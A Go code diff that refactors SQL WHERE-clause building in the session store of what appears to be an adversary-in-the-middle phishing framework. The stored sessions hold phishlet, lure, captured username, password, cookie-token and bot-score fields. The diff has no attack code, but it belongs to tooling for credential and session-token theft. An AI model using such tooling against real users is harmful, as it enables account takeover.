@@ -94,15 +94,11 @@ func (s *Sessions) ListSessions(f aitm.SessionFilter) ([]*aitm.Session, error) {
 	if f.CompletedOnly && f.IncompleteOnly {
 		return nil, aitm.ErrInvalidFilter
 	}
-	where, args := sessionWhere(f)
+	clause, args := sessionWhereClause(f)
 
 	q := `SELECT id, phishlet, lure_id, remote_addr, user_agent, ja4_hash,
 		bot_score, username, password, custom, cookie_tokens, body_tokens,
-		http_tokens, puppet_id, started_at, completed_at FROM sessions`
-	if len(where) > 0 {
-		q += " WHERE " + strings.Join(where, " AND ")
-	}
-	q += " ORDER BY started_at DESC"
+		http_tokens, puppet_id, started_at, completed_at FROM sessions` + clause + " ORDER BY started_at DESC"
 	if f.Limit > 0 {
 		q += fmt.Sprintf(" LIMIT %d", f.Limit)
 	}
@@ -131,12 +127,8 @@ func (s *Sessions) CountSessions(f aitm.SessionFilter) (int, error) {
 	if f.CompletedOnly && f.IncompleteOnly {
 		return 0, aitm.ErrInvalidFilter
 	}
-	where, args := sessionWhere(f)
-
-	q := "SELECT COUNT(*) FROM sessions"
-	if len(where) > 0 {
-		q += " WHERE " + strings.Join(where, " AND ")
-	}
+	clause, args := sessionWhereClause(f)
+	q := "SELECT COUNT(*) FROM sessions" + clause
 
 	var count int
 	if err := s.db.db.QueryRow(q, args...).Scan(&count); err != nil {
@@ -145,7 +137,18 @@ func (s *Sessions) CountSessions(f aitm.SessionFilter) (int, error) {
 	return count, nil
 }
 
+// sessionWhereClause returns the full " WHERE ..." suffix (or empty string) for a filter.
+func sessionWhereClause(f aitm.SessionFilter) (string, []any) {
+	where, args := sessionWhere(f)
+	if len(where) == 0 {
+		return "", args
+	}
+	return " WHERE " + strings.Join(where, " AND "), args
+}
+
 // sessionWhere builds the WHERE clause predicates and bind args for a SessionFilter.
+// All predicates are hardcoded literals with parameterized values — no user input
+// is interpolated into the SQL string.
 func sessionWhere(f aitm.SessionFilter) ([]string, []any) {
 	var where []string
 	var args []any
